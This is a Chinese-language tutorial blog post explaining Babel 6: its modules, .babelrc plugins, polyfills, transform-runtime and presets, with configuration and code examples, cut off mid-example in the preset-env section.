<p>经常有人在使用<code>babel</code>的时候并没有弄懂babel是干嘛的，只知道要写ES6就要在webpack中引入一个babel-loader，然后胡乱在网上copy一个<code>.babelrc</code>到项目目录就开始了（ps: 其实我说的是我自己）。理解babel的配置很重要，可以避免一些不必要的坑，比如：代码中使用<code>Object.assign</code>在一些低版本浏览器会报错，以为是<code>webpack</code>打包时出现了什么问题，其实是<code>babel</code>的配置问题。</p>
<h3 id="ES6"><a href="#ES6" class="headerlink" title="ES6"></a>ES6</h3><p>正文之前先谈谈<code>ES6</code>，ES即<code>ECMAScript</code>，6表示第六个版本(也被称为是<code>ES2015</code>，因为是2015年发布的)，它是javascript的实现标准。</p>
<p>被纳入到ES标准的语法必须要经过如下五个阶段:</p>
<ul>
<li>1.Stage 0: strawman</li>
<li>2.Stage 1: proposal</li>
<li>3.Stage 2: draft - 必须包含<code>2个实验性的具体实现</code>，其中一个可以是用转译器实现的，例如Babel。</li>
<li>4.Stage 3: candidate - 至少要有<code>2个符合规范的具体实现</code>。</li>
<li>5.Stage 4: finished</li>
</ul>
<p>可以看到提案在进入stage3阶段时就已经在一些环境被实现，在stage2阶段有babel的实现。所以被纳入到ES标准的语法其实在大部分环境都已经是有了实现的，那么为什么还要用babel来进行转译，因为不能确保每个运行代码的环境都是最新版本并已经实现了规范。</p>
<p>更多关于ES6的内容可以参考hax的live:<a href="https://www.zhihu.com/lives/883307634416054272?utm_source=qq&amp;utm_medium=social" target="_blank" rel="noopener">Hax：如何学习和实践ES201X？</a></p>
<hr>
<h3 id="Babel的版本变更"><a href="#Babel的版本变更" class="headerlink" title="Babel的版本变更"></a>Babel的版本变更</h3><p>写这篇文章时babel版本已经到了<a href="https://github.com/babel/babel/releases/tag/v7.0.0-beta.3" target="_blank" rel="noopener">v7.0.0-beta.3</a>,也就是说7.0的正式版就要发布了，可喜可贺。但是今天不谈7.0，只谈babel6，在我知道并开始使用的babel的时候babel已经到了版本6，没有经历过5的时代。</p>
<p>在<code>babel5</code>的时代，<code>babel</code>属于全家桶型，只要安装<code>babel</code>就会安装<code>babel</code>相关的所有工具，<br>即装即用。</p>
<p>但是到了babel6，具体有以下几点变更：</p>
<ul>
<li><p>移除<code>babel</code>全家桶安装，拆分为单独模块，例如：babel-core、babel-cli、babel-node、babel-polyfill等；<br>可以在<code>babel</code>的github仓库看到babel现在有哪些模块。<br>babel-package<br><img src="/static/img/2602614175-59ed858f80493_articlex.png"></p>
</li>
<li><p>新增 .babelrc 配置文件，基本上所有的babel转译都会来读取这个配置；</p>
</li>
<li>新增 plugin 配置，所有的东西都插件化，什么代码要转译都能在插件中自由配置；</li>
<li>新增 preset 配置，babel5会默认转译ES6和jsx语法，babel6转译的语法都要在perset中配置，preset简单说就是一系列plugin包的使用。</li>
</ul>
<hr>
<h3 id="babel各个模块介绍"><a href="#babel各个模块介绍" class="headerlink" title="babel各个模块介绍"></a>babel各个模块介绍</h3><p>babel6将babel全家桶拆分成了许多不同的模块，只有知道这些模块怎么用才能更好的理解babel。</p>
<p>下面的一些示例代码已经上传到了<a href="https://github.com/Shenfq/studyBabel" target="_blank" rel="noopener">github</a>，欢迎访问，欢迎star。</p>
<p>安装方式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#通过npm安装</span></span><br><span class="line">npm install babel-core babel-cli babel-node</span><br><span class="line"></span><br><span class="line"><span class="comment">#通过yarn安装</span></span><br><span class="line">yarn add babel-core babel-cli babel-node</span><br></pre></td></tr></table></figure>
<h4 id="1、babel-core"><a href="#1、babel-core" class="headerlink" title="1、babel-core"></a>1、<a href="http://babeljs.io/docs/usage/api/" target="_blank" rel="noopener">babel-core</a></h4><p>看名字就知道，babel-core是作为babel的核心存在，babel的核心api都在这个模块里面，比如：transform。</p>
<p>下面介绍几个babel-core中的api</p>
<ul>
<li>babel.transform：用于字符串转码得到AST</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @param &#123;string&#125; code 要转译的代码字符串</span></span><br><span class="line"><span class="comment"> * @param &#123;object&#125; options 可选，配置项</span></span><br><span class="line"><span class="comment"> * @return &#123;object&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">babel.transform(code: string, options?: <span class="built_in">Object</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回一个对象(主要包括三个部分)：</span></span><br><span class="line">&#123;</span><br><span class="line">    generated code, <span class="comment">//生成码</span></span><br><span class="line">    sources map, <span class="comment">//源映射</span></span><br><span class="line">    AST  <span class="comment">//即abstract syntax tree，抽象语法树</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>更多关于AST知识点请看<a href="https://www.zhihu.com/question/20346372" target="_blank" rel="noopener">这里</a>。</p>
<p>一些使用babel插件的打包或构建工具都有使用到这个方法，下面是一些引入babel插件中的源码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//gulp-babel</span></span><br><span class="line"><span class="keyword">const</span> babel = <span class="built_in">require</span>(<span class="string">'babel-core'</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">some codes...</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span> (<span class="params">opts</span>) </span>&#123;</span><br><span class="line">    opts = opts || &#123;&#125;;</span><br><span class="line">    <span class="keyword">return</span> through.obj(<span class="function"><span class="keyword">function</span> (<span class="params">file, enc, cb</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> fileOpts = <span class="built_in">Object</span>.assign(&#123;&#125;, opts, &#123;</span><br><span class="line">                filename: file.path,</span><br><span class="line">                filenameRelative: file.relative,</span><br><span class="line">                sourceMap: <span class="built_in">Boolean</span>(file.sourceMap),</span><br><span class="line">                sourceFileName: file.relative,</span><br><span class="line">                sourceMapTarget: file.relative</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="keyword">const</span> res = babel.transform(file.contents.toString(), fileOpts);</span><br><span class="line">            <span class="keyword">if</span> (res !== <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">//some codes</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">            <span class="comment">//some codes</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//babel-loader</span></span><br><span class="line"><span class="keyword">var</span> babel = <span class="built_in">require</span>(<span class="string">"babel-core"</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">some codes...</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">var</span> transpile = <span class="function"><span class="keyword">function</span> <span class="title">transpile</span>(<span class="params">source, options</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//some code</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        result = babel.transform(source, options);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="comment">//some codes</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//some codes</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//rollup-pugin-babel</span></span><br><span class="line"><span class="keyword">import</span> &#123; buildExternalHelpers, transform &#125; <span class="keyword">from</span> <span class="string">'babel-core'</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">some codes...</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> <span class="title">babel</span> (<span class="params"> options </span>) </span>&#123;</span><br><span class="line">    <span class="comment">//some codes</span></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="comment">// some methods</span></span><br><span class="line">        transform ( code, id ) &#123;</span><br><span class="line">            <span class="keyword">const</span> transformed = transform( code, localOpts );</span><br><span class="line">            <span class="comment">//some codes</span></span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                code: transformed.code,</span><br><span class="line">                map: transformed.map</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面是一些打包工具引入babel插件时的一些源码，可以看到基本都是先通过调用transform方法进行代码转码。</p>
<ul>
<li><p>babel.transformFile</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//异步的文件转码方式，回调函数中的result与transform返回的对象一至。</span></span><br><span class="line">babel.transformFile(<span class="string">"filename.js"</span>, options, <span class="function"><span class="keyword">function</span> (<span class="params">err, result</span>) </span>&#123;</span><br><span class="line">  result; <span class="comment">// =&gt; &#123; code, map, ast &#125;</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
</li>
<li><p>babel.transformFileSync</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//同步的文件转码方式，返回结果与transform返回的对象一至。</span></span><br><span class="line">babel.transformFileSync(filename, options) <span class="comment">// =&gt; &#123; code, map, ast &#125;</span></span><br><span class="line">babel.transformFromAst</span><br><span class="line"><span class="comment">//将ast进行转译</span></span><br><span class="line"><span class="keyword">const</span> &#123; code, map, ast &#125; = babel.transformFromAst(ast, code, options);</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="2、babel-cli"><a href="#2、babel-cli" class="headerlink" title="2、babel-cli"></a>2、<a href="http://babeljs.io/docs/usage/cli" target="_blank" rel="noopener">babel-cli</a></h4><p>babel-cli是一个通过命令行对js文件进行换码的工具。</p>
<p>使用方法：</p>
<ul>
<li><p>直接在命令行输出转译后的代码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">babel script.js</span><br></pre></td></tr></table></figure>
</li>
<li><p>指定输出文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">babel script.js --out-file build.js</span><br><span class="line">或者是</span><br><span class="line">babel script.js -o build.js</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>让我们来编写了一个具有箭头函数的代码：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//script.js</span></span><br><span class="line"><span class="keyword">const</span> array = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>].map(<span class="function">(<span class="params">item, index</span>) =&gt;</span> item * <span class="number">2</span>);</span><br></pre></td></tr></table></figure></p>
<p>然后在命令行执行 babel script.js，发现输出的代码好像没有转译。<br><img str="/static/img/ddddwwww.png"></p>
<p>因为我们没有告诉babel要转译哪些类型，现在看看怎么指定转译代码中的箭头函数。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">babel --plugins transform-es2015-arrow-functions script.js</span><br></pre></td></tr></table></figure></p>
<p><img src="/static/img/wwwwdddd.png"></p>
<p>或者在目录里添加一个<code>.babelrc</code>文件，内容如下：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">"plugins"</span>: [</span><br><span class="line">        <span class="string">"transform-es2015-arrow-functions"</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><code>.babelrc</code>是<code>babel</code>的全局配置文件，所有的<code>babel</code>操作（包括babel-core、babel-node）基本都会来读取这个配置，后面会详细介绍。</p>
<h4 id="3、babel-node"><a href="#3、babel-node" class="headerlink" title="3、babel-node"></a>3、babel-node</h4><p>babel-node是随babel-cli一起安装的，只要安装了babel-cli就会自带babel-node。<br>在命令行输入babel-node会启动一个REPL（Read-Eval-Print-Loop），这是一个支持ES6的js执行环境。</p>
<p><img src="/static/img/dw.png"></p>
<p>其实不用babel-node，直接在node下，只要node版本大于6大部分ES6语法已经支持，况且现在node的版本已经到了8.7.0。</p>
<p><img src="/static/img/ddww.png"></p>
<p>babel-node还能直接用来执行js脚本，与直接使用node命令类似，只是会在执行过程中进行babel的转译，并且babel官方不建议在生产环境直接这样使用，因为babel实时编译产生的代码会缓存在内存中，导致内存占用过高，所以我们了解了解就好。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">babel-node script.js</span><br></pre></td></tr></table></figure></p>
<h4 id="4、babel-register"><a href="#4、babel-register" class="headerlink" title="4、babel-register"></a>4、<a href="http://babeljs.io/docs/usage/babel-register/" target="_blank" rel="noopener">babel-register</a></h4><p>babel-register字面意思能看出来，这是babel的一个注册器，它在底层改写了node的require方法，引入babel-register之后所有require并以.es6, .es, .jsx 和 .js为后缀的模块都会经过babel的转译。</p>
<p>同样通过箭头函数做个实验：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//test.js</span><br><span class="line">const name = &apos;shenfq&apos;;</span><br><span class="line">module.exports = () =&gt; &#123;</span><br><span class="line">    const json = &#123;name&#125;;</span><br><span class="line">    return json;</span><br><span class="line">&#125;;</span><br><span class="line">//main.js</span><br><span class="line">require(&apos;babel-register&apos;);</span><br><span class="line">var test = require(&apos;./test.js&apos;);  //test.js中的es6语法将被转译成es5</span><br><span class="line"></span><br><span class="line">console.log(test.toString()); //通过toString方法，看看控制台输出的函数是否被转译</span><br></pre></td></tr></table></figure></p>
<p><img src="/static/img/mmdd.png"></p>
<p>默认babel-register会忽略对node_modules目录下模块的转译，如果要开启可以进行如下配置。<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">"babel-register"</span>)(&#123;</span><br><span class="line">  ignore: <span class="literal">false</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>babel-register与babel-core会同时安装，在babel-core中会有一个register.js文件，所以引入babel-register有两种方法：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">'babel-core/register'</span>);</span><br><span class="line"><span class="built_in">require</span>(<span class="string">'babel-register'</span>);</span><br></pre></td></tr></table></figure></p>
<p>但是官方不推荐第一种方法，因为babel-register已经独立成了一个模块，在babel-core的register.js文件中有如下注释。</p>
<blockquote>
<p>TODO: eventually deprecate this console.trace(“use the <code>babel-register</code> package instead of <code>babel-core/register</code>“);</p>
</blockquote>
<h4 id="5、babel-polyfill"><a href="#5、babel-polyfill" class="headerlink" title="5、babel-polyfill"></a>5、<a href="http://babeljs.io/docs/usage/babel-register/" target="_blank" rel="noopener">babel-polyfill</a></h4><p>polyfill这个单词翻译成中文是<code>垫片</code>的意思，详细点解释就是桌子的桌脚有一边矮一点，拿一个东西把桌子垫平。polyfill在代码中的作用主要是用已经存在的语法和api实现一些浏览器还没有实现的api，对浏览器的一些缺陷做一些修补。例如Array新增了includes方法，我想使用，但是低版本的浏览器上没有，我就得做兼容处理：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="built_in">Array</span>.prototype.includes) &#123;</span><br><span class="line">  <span class="built_in">Object</span>.defineProperty(<span class="built_in">Array</span>.prototype, <span class="string">'includes'</span>, &#123;</span><br><span class="line">    value: <span class="function"><span class="keyword">function</span>(<span class="params">searchElement, fromIndex</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span> == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">'"this" is null or not defined'</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">var</span> o = <span class="built_in">Object</span>(<span class="keyword">this</span>);</span><br><span class="line">      <span class="keyword">var</span> len = o.length &gt;&gt;&gt; <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> (len === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">var</span> n = fromIndex | <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">var</span> k = <span class="built_in">Math</span>.max(n &gt;= <span class="number">0</span> ? n : len - <span class="built_in">Math</span>.abs(n), <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">while</span> (k &lt; len) &#123;</span><br><span class="line">        <span class="keyword">if</span> (o[k] === searchElement) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        k++;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>上面简单的提供了一个<code>includes</code>方法的<code>polyfill</code>，代码来自<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/includes" target="_blank" rel="noopener">MDN</a>。</p>
<p>理解<code>polyfill</code>的意思之后，再来说说<code>babel</code>为什么存在<code>polyfill</code>。因为<code>babel</code>的转译只是语法层次的转译，例如箭头函数、解构赋值、class，对一些新增api以及全局函数（例如：<code>Promise</code>）无法进行转译，这个时候就需要在代码中引入<code>babel-polyfill</code>，让代码完美支持<code>ES6+</code>环境。前面介绍的babel-node就会自动在代码中引入<code>babel-polyfill</code>包。</p>
<p>引入方法：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//在代码的最顶部进行require或者import</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">require</span>(<span class="string">"babel-polyfill"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"babel-polyfill"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果使用webpack，也可以在文件入口数组引入</span></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  entry: [<span class="string">"babel-polyfill"</span>, <span class="string">"./app/js"</span>]</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>但很多时候我们并不会使用所有ES6+语法，全局添加所有垫片肯定会让我们的代码量上升，之后会介绍其他添加垫片的方式。</p>
<hr>
<h3 id="babelrc"><a href="#babelrc" class="headerlink" title=".babelrc"></a>.babelrc</h3><p>前面已经介绍了<code>babel</code>常用的一些模块，接下来看看babel的配置文件 <code>.babelrc</code>。</p>
<p>后面的后缀rc来自linux中，使用过linux就知道linux中很多rc结尾的文件，比如<code>.bashrc</code>，rc是<code>run command</code>的缩写，翻译成中文就是运行时的命令，表示程序执行时就会来调用这个文件。</p>
<p>babel所有的操作基本都会来读取这个配置文件，除了一些在回调函数中设置options参数的，如果没有这个配置文件，会从<code>package.json</code>文件的babel属性中读取配置。</p>
<p>plugins<br>先简单介绍下 plugins ，babel中的插件，通过配置不同的插件才能告诉babel，我们的代码中有哪些是需要转译的。</p>
<p>这里有一个babel官网的<a href="http://babeljs.io/docs/plugins/" target="_blank" rel="noopener">插件列表</a>，里面有目前babel支持的全部插件。</p>
<p>举个例子：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">"plugins"</span>: [</span><br><span class="line">        <span class="string">"transform-es2015-arrow-functions"</span>, <span class="comment">//转译箭头函数</span></span><br><span class="line">        <span class="string">"transform-es2015-classes"</span>, <span class="comment">//转译class语法</span></span><br><span class="line">        <span class="string">"transform-es2015-spread"</span>, <span class="comment">//转译数组解构</span></span><br><span class="line">        <span class="string">"transform-es2015-for-of"</span> <span class="comment">//转译for-of</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//如果要为某个插件添加配置项，按如下写法：</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"plugins"</span>:[</span><br><span class="line">        <span class="comment">//改为数组，第二个元素为配置项</span></span><br><span class="line">        [<span class="string">"transform-es2015-arrow-functions"</span>, &#123; <span class="string">"spec"</span>: <span class="literal">true</span> &#125;]</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>上面这些都只是语法层次的转译，前面说过有些api层次的东西需要引入polyfill，同样babel也有一系列插件来支持这些。<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">"plugins"</span>:[</span><br><span class="line">        <span class="comment">//如果我们在代码中使用Object.assign方法，就用如下插件</span></span><br><span class="line">        <span class="string">"transform-object-assign"</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//写了一个使用Object.assign的代码如下：</span></span><br><span class="line"><span class="keyword">const</span> people = <span class="built_in">Object</span>.assign(&#123;&#125;, &#123;</span><br><span class="line">    name: <span class="string">'shenfq'</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">//经过babel转译后如下：</span></span><br><span class="line"><span class="keyword">var</span> _extends = <span class="built_in">Object</span>.assign || <span class="function"><span class="keyword">function</span> (<span class="params">target</span>) </span>&#123; <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &lt; <span class="built_in">arguments</span>.length; i++) &#123; <span class="keyword">var</span> source = <span class="built_in">arguments</span>[i]; <span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> source) &#123; <span class="keyword">if</span> (<span class="built_in">Object</span>.prototype.hasOwnProperty.call(source, key)) &#123; target[key] = source[key]; &#125; &#125; &#125; <span class="keyword">return</span> target; &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> people = _extends(&#123;&#125;, &#123;</span><br><span class="line">    name: <span class="string">'shenfq'</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>这种通过transform添加的polyfill只会引入到当前模块中，试想实际开发中存在多个模块使用同一个api，每个模块都引入相同的polyfill，大量重复的代码出现在项目中，这肯定是一种灾难。另外一个个的引入需要polyfill的transform挺麻烦的，而且不能保证手动引入的transform一定正确，等会会提供一个解决方案：<code>transform-runtime</code>。</p>
<p>除了添加polyfill，babel还有一个工具包helpers，如果你有安装babel-cli，你可以直接通过下面的命令把这个工具包输出：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">./node_modules/.bin/babel-external-helpers &gt; helpers.js</span><br></pre></td></tr></table></figure></p>
<p>这个工具包类似于babel的utils模块，就像我们项目中的utils一样，很多地方都会用到，例如babel实现Object.assign就是使用的helpers中的_extend方法。为了避免同一个文件多次引用<code>babel</code>的助手函数，通过<code>external-helpers</code>插件，能够把这些助手函数抽出放到文件顶部，避免多次引用。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//安装： cnpm install --save-dev babel-plugin-external-helpers</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//配置</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"plugins"</span>: [<span class="string">"external-helpers"</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>虽然这个插件能避免一个文件多次引用助手函数，但是并不能直接避免多个文件内重复引用，这与前面说到的通过transform添加polyfill是一样的问题，这些引用都只是module级别的，在打包工具盛行的今天，需要考虑如何减少多个模块重复引用相同代码造成代码冗余。</p>
<p>当然也可以在每个需要使用helpers的js文件顶部直接引入之前生成的helpers文件既可，通过打包工具将这个公共模块进行抽离。<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">'helpers'</span>);</span><br></pre></td></tr></table></figure></p>
<p>在说完babel的helpers之后就到了插件系统的最后的一个插件：<code>transform-runtime</code>。前面在transform-polyfill的时候也有提到这个插件，之所以把它放到helpers后面是因为这个插件能自动为项目引入polyfill和helpers。<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">cnpm install -D babel-plugin-transform-runtime babel-runtime</span><br></pre></td></tr></table></figure></p>
<p>transform-runtime这个插件依赖于babel-runtime，所以安装transform-runtime的同时最好也安装babel-runtime，为了防止一些不必要的错误。babel-runtime由三个部分组成：</p>
<p>1、<a href="https://github.com/zloirock/core-js" target="_blank" rel="noopener">core-js</a></p>
<blockquote>
<p>core-js极其强悍，通过ES3实现了大部分的ES5、6、7的垫片，作者zloirock是来自战斗名族的程序员，一个人维护着core-js，听说他最近还在找工作，上面是core-js的github地址，感兴趣可以去看看。</p>
</blockquote>
<p>2、<a href="http://facebook.github.io/regenerator/" target="_blank" rel="noopener">regenerator</a></p>
<blockquote>
<p>regenerator来自facebook的一个库，用于实现 generator functions。</p>
</blockquote>
<p>3、helpers</p>
<blockquote>
<p>babel的一些工具函数，没错，这个helpers和前面使用babel-external-helpers生成的helpers是同一个东西<br>从babel-runtime的package.json文件中也能看出，runtime依赖了哪些东西。</p>
</blockquote>
<p><img src="/static/img/ggff.png"></p>
<p>安装有babel-runtime之后要引入helpers可以使用如下方式：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">'babel-runtime/helpers'</span>);</span><br></pre></td></tr></table></figure></p>
<p>使用runtime的时候还有一些配置项：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">"plugins"</span>: [</span><br><span class="line">        [<span class="string">"transform-runtime"</span>, &#123;</span><br><span class="line">            <span class="string">"helpers"</span>: <span class="literal">false</span>, <span class="comment">//自动引入helpers</span></span><br><span class="line">            <span class="string">"polyfill"</span>: <span class="literal">false</span>, <span class="comment">//自动引入polyfill（core-js提供的polyfill）</span></span><br><span class="line">            <span class="string">"regenerator"</span>: <span class="literal">true</span>, <span class="comment">//自动引入regenerator</span></span><br><span class="line">        &#125;]</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="比较transform-runtime与babel-polyfill引入垫片的差异："><a href="#比较transform-runtime与babel-polyfill引入垫片的差异：" class="headerlink" title="比较transform-runtime与babel-polyfill引入垫片的差异："></a>比较<code>transform-runtime</code>与<code>babel-polyfill</code>引入垫片的差异：</h3><ul>
<li>1、使用runtime是按需引入，需要用到哪些polyfill，runtime就自动帮你引入哪些，不需要再手动一个个的去配置plugins，只是引入的polyfill不是全局性的，有些局限性。而且runtime引入的polyfill不会改写一些实例方法，比如Object和Array原型链上的方法，像前面提到的Array.protype.includes。</li>
<li>2、<code>babel-polyfill</code>就能解决runtime的那些问题，它的垫片是全局的，而且全能，基本上ES6中要用到的polyfill在<code>babel-polyfill</code>中都有，它提供了一个完整的<code>ES6+</code>的环境。<code>babel</code>官方建议只要不在意<code>babel-polyfill</code>的体积，最好进行全局引入，因为这是最稳妥的方式。</li>
<li>3、一般的建议是开发一些框架或者库的时候使用不会污染全局作用域的<code>babel-runtime</code>，而开发web应用的时候可以全局引入<code>babel-polyfill</code>避免一些不必要的错误，而且大型web应用中全局引入<code>babel-polyfill</code>可能还会减少你打包后的文件体积（相比起各个模块引入重复的polyfill来说）。</li>
</ul>
<hr>
<h4 id="presets"><a href="#presets" class="headerlink" title="presets"></a>presets</h4><p>显然这样一个一个配置插件会非常的麻烦，为了方便，<code>babel</code>为我们提供了一个配置项叫做<code>persets</code>（预设）。</p>
<p>预设就是一系列插件的集合，就好像修图一样，把上次修图的一些参数保存为一个预设，下次就能直接使用。</p>
<p>如果要转译ES6语法，只要按如下方式配置即可：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//先安装ES6相关preset： cnpm install -D babel-preset-es2015</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"presets"</span>: [<span class="string">"es2015"</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果要转译的语法不止ES6，还有各个提案阶段的语法也想体验，可以按如下方式。</span></span><br><span class="line"><span class="comment">//安装需要的preset： cnpm install -D babel-preset-stage-0 babel-preset-stage-1 babel-preset-stage-2 babel-preset-stage-3</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"presets"</span>: [</span><br><span class="line">        <span class="string">"es2015"</span>,</span><br><span class="line">        <span class="string">"stage-0"</span>,</span><br><span class="line">        <span class="string">"stage-1"</span>,</span><br><span class="line">        <span class="string">"stage-2"</span>,</span><br><span class="line">        <span class="string">"stage-3"</span>,</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//同样babel也能直接转译jsx语法，通过引入react的预设</span></span><br><span class="line"><span class="comment">//cnpm install -D babel-preset-react</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"presets"</span>: [</span><br><span class="line">        <span class="string">"es2015"</span>,</span><br><span class="line">        <span class="string">"react"</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>不过上面这些<code>preset</code>官方现在都已经不推荐了，官方唯一推荐<strong>preset</strong>：<code>babel-preset-env</code>。</p>
<p>这款<code>preset</code>能灵活决定加载哪些插件和<code>polyfill</code>，不过还是得开发者手动进行一些配置。<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// cnpm install -D babel-preset -env</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"presets"</span>: [</span><br><span class="line">        [<span class="string">"env"</span>, &#123;</span><br><span class="line">            <span class="string">"targets"</span>: &#123; <span class="comment">//指定要转译到哪个环境</span></span><br><span class="line">                <span class="comment">//浏览器环境</span></span><br><span class="line">                <span class="string">"browsers"</span>: [<span class="string">"last 2 versions"</span>, <span class="string">"safari &gt;= 7"</span>],</span><br><span class="line">                <span class="comment">//node环境</span></span><br><span class="line">                <span class="string">"node"</span>: <span class="string">"6.10"</span>, <span class="comment">//"current"  使用当前版本的node</span></span><br><span class="line"></span><br><span class="line">            &#125;,</span><br><span class="line">             <span 